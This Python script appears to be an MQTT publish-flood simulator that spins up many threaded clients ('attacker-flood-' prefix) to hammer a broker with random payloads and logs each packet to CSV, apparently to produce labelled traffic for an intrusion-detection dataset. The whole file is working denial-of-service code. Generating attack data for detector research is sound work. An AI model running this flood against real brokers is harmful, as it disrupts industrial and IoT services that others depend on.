"""High-rate MQTT publish flood generator."""

import argparse
import csv
import os
import random
import string
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

def build_payload(size: int) -> bytes:
    alphabet = string.ascii_letters + string.digits
    body = ''.join(random.choice(alphabet) for _ in range(size))
    return body.encode("utf-8")

def ensure_connection(client: mqtt.Client, broker: str, port: int, keepalive: int, retry_delay: float, stop_event: threading.Event) -> bool:
    while not stop_event.is_set():
        try:
            client.connect(broker, port, keepalive)
            client.loop_start()
            return True
        except Exception as exc:
            print(f"[connect] failed: {exc}. retrying in {retry_delay}s")
            time.sleep(retry_delay)
    return False

def publish_worker(worker_id: int, args, stop_event: threading.Event, log_writer, log_lock: threading.Lock):
    client_id = f"{args.client_prefix}{worker_id:03d}"
    topic = args.topic_template.format(client=client_id, idx=worker_id)
    client = mqtt.Client(client_id=client_id, clean_session=True, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    if args.username:
        client.username_pw_set(args.username, args.password)

    if not ensure_connection(client, args.broker, args.port, args.keepalive, args.retry_delay, stop_event):
        return

    interval = 1.0 / args.msg_rate if args.msg_rate > 0 else 0.0
    payload = build_payload(args.payload_bytes)

    sent = 0
    next_stats = time.time() + args.stats_interval
    try:
        while not stop_event.is_set():
            now = datetime.now(timezone.utc)
            result, mid = client.publish(topic, payload, qos=args.qos, retain=args.retain)
            if result != mqtt.MQTT_ERR_SUCCESS:
                print(f"[{client_id}] publish error code {result}")
            if log_writer:
                with log_lock:
                    # Enhanced logging with required fields for detection
                    src_ip = "localhost"  # Client perspective - would be filled by packet capture
                    packet_type = "PUBLISH"
                    payload_length = len(payload)
                    log_writer.writerow([
                        now.isoformat(),
                        client_id, 
                        src_ip,
                        topic, 
                        packet_type,
                        payload_length,
                        args.qos,
                        mid, 
                        result
                    ])
            sent += 1
            if args.stats_interval and time.time() >= next_stats:
                print(f"[{client_id}] messages sent: {sent}")
                next_stats += args.stats_interval
            if interval > 0:
                time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        client.loop_stop()
        client.disconnect()

def prep_log(path: str):
    if not path:
        return None, None
    exists = os.path.exists(path)
    fh = open(path, "a", newline="", encoding="utf-8")
    writer = csv.writer(fh)
    if not exists:
        writer.writerow([
            "timestamp", "client_id", "src_ip", "topic", 
            "packet_type", "payload_length", "qos", "mid", "result"
        ])
    return writer, fh

def main():
    parser = argparse.ArgumentParser(description="MQTT publish flood simulator")
    parser.add_argument("--broker", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--keepalive", type=int, default=30)
    parser.add_argument("--clients", type=int, default=10)
    parser.add_argument("--msg-rate", type=float, default=200.0, help="messages per second per client")
    parser.add_argument("--payload-bytes", type=int, default=128)
    parser.add_argument("--qos", type=int, default=0)
    parser.add_argument("--retain", action="store_true")
    parser.add_argument("--client-prefix", default="attacker-flood-")
    parser.add_argument("--topic-template", default="factory/attack/{client}/telemetry")
    parser.add_argument("--duration", type=float, default=0.0, help="seconds to run (0 means until Ctrl+C)")
    parser.add_argument("--username")
    parser.add_argument("--password")
    parser.add_argument("--retry-delay", type=float, default=2.0)
    parser.add_argument("--stats-interval", type=float, default=5.0)
    parser.add_argument("--log-csv", help="path to append publish log")
    args = parser.parse_args()

    stop_event = threading.Event()

    log_writer, log_handle = prep_log(args.log_csv)
    log_lock = threading.Lock()

    workers = []
    for worker_id in range(args.clients):
        t = threading.Thread(target=publish_worker, args=(worker_id, args, stop_event, log_writer, log_lock), daemon=True)
        t.start()
        workers.append(t)

    try:
        if args.duration > 0:
            stop_event.wait(args.duration)
        else:
            while True:
                time.sleep(1.0)
    except KeyboardInterrupt:
        pass

    stop_event.set()
    for t in workers:
        t.join()

    if log_handle:
        log_handle.flush()
        log_handle.close()

if __name__ == "__main__":
    main()
